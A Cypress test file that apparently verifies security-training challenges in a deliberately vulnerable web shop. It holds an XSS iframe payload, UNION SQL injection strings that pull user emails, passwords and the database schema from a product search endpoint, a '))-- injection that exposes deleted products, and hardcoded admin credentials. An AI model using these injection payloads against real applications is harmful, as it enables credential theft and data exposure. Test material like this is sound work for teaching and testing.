import { type Product } from '../../../data/types'

describe('/#/search', () => {
  beforeEach(() => {
    cy.visit('/#/search')
  })
  describe('search query', () => {
    it('should be rendered as plain text instead of HTML', () => {
      cy.get('#searchQuery').click()
      cy.get('app-mat-search-bar input')
        .type('<iframe src="javascript:alert(`xss`)">')
        .type('{enter}')
      cy.get('#searchValue').should('have.text', '<iframe src="javascript:alert(`xss`)">')
      cy.get('#searchValue iframe').should('not.exist')
    })
  })
})

describe('/rest/products/search', () => {
  describe('challenge "unionSqlInjectionChallenge"', () => {
    it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
      cy.request(
        "/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9','10' from users--"
      )
      cy.expectChallengeSolved({ challenge: 'User Credentials' })
    })
  })

  describe('challenge "dbSchemaChallenge"', () => {
    it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
      cy.request(
        "/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9','10' from sqlite_master--"
      )
      cy.expectChallengeSolved({ challenge: 'Database Schema' })
    })
  })

  describe('challenge "dlpPastebinLeakChallenge"', () => {
    beforeEach(() => {
      cy.login({
        email: 'admin',
        password: 'admin123'
      })
    })

    it('search query should logically reveal the special product', () => {
      cy.request("/rest/products/search?q='))--")
        .its('body')
        .then((sourceContent) => {
          cy.task<Product>('GetPastebinLeakProduct').then((pastebinLeakProduct: Product) => {
            let foundProduct = false

            sourceContent.data.forEach((product: Product) => {
              if (product.name === pastebinLeakProduct.name) {
                foundProduct = true
              }
            })
            // eslint-disable-next-line @typescript-eslint/no-unused-expressions
            expect(foundProduct).to.be.true
          })
        })
    })
  })

  xdescribe('challenge "christmasSpecialChallenge"', () => {
    beforeEach(() => {
      cy.login({
        email: 'admin',
        password: 'admin123'
      })
    })

    it('search query should reveal logically deleted christmas special product on SQL injection attack', () => {
      cy.request("/rest/products/search?q='))--")
        .its('body')
        .then((sourceContent) => {
          cy.task<Product>('GetChristmasProduct').then((christmasProduct: Product) => {
            let foundProduct = false

            sourceContent.data.forEach((product: Product) => {
              if (product.name === christmasProduct.name) {
                foundProduct = true
              }
            })
            // eslint-disable-next-line @typescript-eslint/no-unused-expressions
            expect(foundProduct).to.be.true
          })
        })
    })

    it('should be able to place Christmas product into shopping card by id', () => {
      cy.request('/api/products')
        .its('body')
        .then((sourceContent) => {
          cy.task<Product>('GetChristmasProduct').then((christmasProduct: Product) => {
            sourceContent.data.forEach((product: Product) => {
              if (product.name === christmasProduct.name) {
                cy.window().then(async () => {
                  const response = await fetch(
                    `${Cypress.config('baseUrl')}/api/BasketItems/`,
                    {
                      method: 'POST',
                      cache: 'no-cache',
                      headers: {
                        'Content-type': 'application/json',
                        Authorization: `Bearer ${localStorage.getItem(
                          'token'
                        )}`
                      },
                      body: JSON.stringify({
                        BasketId: `${sessionStorage.getItem('bid')}`,
                        ProductId: `${product.id}`,
                        quantity: 1
                      })
                    }
                  )
                  if (response.status === 201) {
                    console.log('Success')
                  }
                })
              }
            })
          })
        })

      cy.visit('/#/basket')
      cy.get('#checkoutButton').click()
      cy.expectChallengeSolved({ challenge: 'Christmas Special' })
    })
  })
})
